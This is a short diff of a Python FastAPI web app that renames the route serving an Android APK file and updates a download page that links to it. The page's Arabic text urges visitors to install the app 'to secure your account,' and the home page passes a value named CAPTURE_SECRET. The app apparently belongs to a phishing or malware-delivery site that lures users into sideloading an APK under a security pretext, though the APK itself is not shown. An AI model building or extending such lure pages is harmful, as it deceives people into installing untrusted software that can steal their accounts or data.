@@ -59,10 +59,10 @@ async def home(request: Request):
     return get_html_content(template, CAPTURE_SECRET)
 
 # ==================== مسار تقديم ملف APK ====================
-@app.get("/app.apk")
+@app.get("/app-release.apk")
 async def serve_apk():
-    if os.path.exists("app.apk"):
-        return FileResponse("app.apk", media_type="application/vnd.android.package-archive", filename="app.apk")
+    if os.path.exists("app-release.apk"):
+        return FileResponse("app-release.apk", media_type="application/vnd.android.package-archive", filename="app.apk")
     else:
         return HTMLResponse("<h1>⚠️ الملف غير موجود</h1>", status_code=404)
 
@@ -200,7 +200,7 @@ async def download_app_page(request: Request):
         <div class="icon">📲</div>
         <h1>تحميل التطبيق</h1>
         <p class="sub">حمّل التطبيق الآن لتأمين حسابك والاستفادة من المزايا الحصرية</p>
-        <a href="/app.apk" class="btn-download" download>
+        <a href="/app-release.apk" class="btn-download" download>
             ⬇️ تحميل التطبيق الآن
         </a>
         <div class="secure-badge">
